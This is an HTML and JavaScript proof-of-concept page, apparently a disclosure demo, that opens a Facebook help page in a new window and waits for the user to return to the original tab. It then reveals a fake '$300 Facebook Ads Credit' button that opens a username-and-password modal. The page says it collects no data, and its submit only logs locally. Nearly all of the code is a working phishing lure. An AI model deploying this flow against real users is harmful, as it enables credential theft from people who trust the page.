<!doctype html>
<html lang="id">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>PoC — Address Bar Spoof (safe demo)</title>
  <style>
    body{font-family:system-ui,Segoe UI,Roboto,Arial;margin:24px;background:#f6f8fb;color:#111}
    .card{max-width:820px;margin:0 auto;padding:18px;border-radius:10px;background:#fff;box-shadow:0 6px 20px rgba(0,0,0,.06)}
    h1{font-size:20px;margin:0 0 8px}
    p{margin:6px 0 12px}
    .controls{display:flex;gap:8px;flex-wrap:wrap}
    input[type=number]{width:100px;padding:6px;border-radius:6px;border:1px solid #ddd}
    button{padding:8px 12px;border-radius:8px;border:0;background:#0b66ff;color:#fff;cursor:pointer}
    button.warn{background:#ff6b6b}
    small{color:#666}
    /* modal */
    .modal { position: fixed; inset:0; display:none; align-items:center; justify-content:center; background:rgba(0,0,0,0.5) }
    .sheet { background:#fff;padding:18px;border-radius:8px; max-width:400px; width:90% }
    .field { display:flex; flex-direction:column; gap:6px; margin-bottom:10px }
    .muted{color:#666;font-size:13px}
  </style>
</head>
<body>
  <div class="card" id="mainCard">
    <h1>THIS IS NOT FACEBOOK.COM! — Free $300 Facebook Ads Credit</h1>
    <p>This PoC does not collect data. Just shows URL/content mismatch and UI changes after returning.</p>

    <div class="controls" id="controls">
      <label>
        Delay (ms):
        <input id="delay" type="number" value="300" min="0" step="10">
      </label>

      <button id="openSpoof">Trigger Spoof</button>
      <!-- hidden until after return -->
      <button id="downloadBtn" style="display:none;background:#16a34a" aria-hidden>Get $300 Credit</button>
    </div>

    <hr>
  </div>

  <!-- Modal (safe simulation) -->
  <div id="modal" class="modal" role="dialog" aria-modal="true">
    <div class="sheet">
      <h3>Get $300 Free Facebook Ads Credit</h3>
      <p class="muted">This is a <strong>safe simulation</strong>. No data collected</p>

      <div class="field">
        <label>Username</label>
        <input placeholder="example@gmail.com">
      </div>
      <div class="field">
        <label>Password</label>
        <input type="password" placeholder="••••••••">
      </div>

      <div style="display:flex;gap:8px;justify-content:flex-end">
        <button id="simulate">Simulate submit</button>
        <button id="closeModal" class="warn" style="background:#ef4444">Close</button>
      </div>

      <p id="simResult" class="muted" style="margin-top:12px"></p>
    </div>
  </div>

<script>
  (function(){
    const openBtn = document.getElementById('openSpoof');
    const downloadBtn = document.getElementById('downloadBtn');
    const delayInput = document.getElementById('delay');
    const modal = document.getElementById('modal');
    const closeModal = document.getElementById('closeModal');
    const simulate = document.getElementById('simulate');
    const simResult = document.getElementById('simResult');

    let openedWin = null;
    let openedAt = null;
    let returned = false;

    function safeOpen(targetUrl, delayMs){
      try {
        openedWin = window.open(targetUrl, "_blank");
      } catch(e){
        alert("Popup blocked or environment prevented window.open");
        return;
      }
      if(!openedWin){
        alert("Popup blocked. Please allow popups or open manually.");
        return;
      }
      openedAt = Date.now();
      // Inject minimal content if same-origin allows (often blocked when target is external).
      setTimeout(()=> {
        try {
          openedWin.document.open();
          openedWin.document.write(`<meta charset="utf-8"><title>Temporary</title><body style="font-family:system-ui;padding:32px"><h1>Temporary page — will navigate to external shortly</h1></body>`);
          openedWin.document.close();
        } catch(e){
          // ignore; browsers block cross-origin writes
        }
        // Finally navigate to target
        try { openedWin.location.href = targetUrl; } catch(e){}
      }, delayMs);
    }

    // Detect when user returns to this tab/window
    function onReturn() {
      if(returned) return;
      returned = true;
      // swap UI: hide trigger, show download/credit button
      document.getElementById('controls').querySelectorAll('button').forEach(b=>b.setAttribute('aria-hidden','true'));
      openBtn.style.display = 'none';
      downloadBtn.style.display = 'inline-block';
    }

    // Two strategies:
    // 1) listen for focus event (works when user switches back or closes child)
    // 2) listen for visibilitychange (tab visibility)
    window.addEventListener('focus', ()=> {
      // basic heuristic: if we had opened a window recently, treat focus as return
      if(openedAt && (Date.now() - openedAt) > 150) {
        onReturn();
      }
    });
    document.addEventListener('visibilitychange', ()=> {
      if(!document.hidden && openedAt && (Date.now() - openedAt) > 150) {
        onReturn();
      }
    });

    openBtn.addEventListener('click', ()=> {
      returned = false;
      const delay = Math.max(0, parseInt(delayInput.value||"300",10));
      safeOpen("https://m.facebook.com/help/1573156092981768/?helpref=login_help", delay);
    });

    downloadBtn.addEventListener('click', ()=> {
      // show safe modal
      modal.style.display = 'flex';
      simResult.textContent = "";
    });

    closeModal.addEventListener('click', ()=> {
      modal.style.display = 'none';
    });

    simulate.addEventListener('click', ()=> {
      simResult.textContent = "SUBMITTED: No data collected. This demonstrates how an attacker could request credentials.";
      console.log("SIMULATED submit (no network):", {
        timestamp: new Date().toISOString(),
        note: "No data was collected in this PoC"
      });
    });

    // close modal by clicking outside
    modal.addEventListener('click', (ev)=> {
      if(ev.target === modal) modal.style.display='none';
    });

  })();
</script>
</body>
</html>
